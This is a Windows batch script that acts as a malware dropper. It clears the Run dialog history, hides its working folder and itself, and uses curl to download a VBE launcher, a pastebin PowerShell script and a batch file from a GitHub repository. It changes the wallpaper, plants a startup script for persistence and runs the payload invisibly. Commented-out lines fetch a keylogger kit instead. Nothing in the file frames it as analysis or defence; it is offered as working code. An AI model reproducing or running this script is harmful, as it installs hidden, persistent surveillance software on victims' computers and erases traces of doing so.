@echo off
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
cd %temp%
if not exist t\ (
  mkdir t
)
attrib +s +h t
attrib +s +h s.bat
cd t

curl -s https://everythingisviral.com/wp-content/uploads/2021/01/gigachad-meme.png -o background.png
curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/invisible.vbe -o i.vbe
curl -s https://pastebin.com/raw/dsLQmyew -o s.ps1
curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/Screenshot/run.bat -o r.bat
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  %temp%\t\background.png /f

cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
echo @echo off>Windows.cmd
echo cd %temp%\t>>Windows.cmd
echo wscript.exe "i.vbe" "r.bat">>Windows.cmd

:: curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/invisible.vbe -o i.vbe
:: curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/keylogger.ps1 -o p.ps1
:: curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/run.bat -o r.bat
wscript.exe "i.vbe" "r.bat"
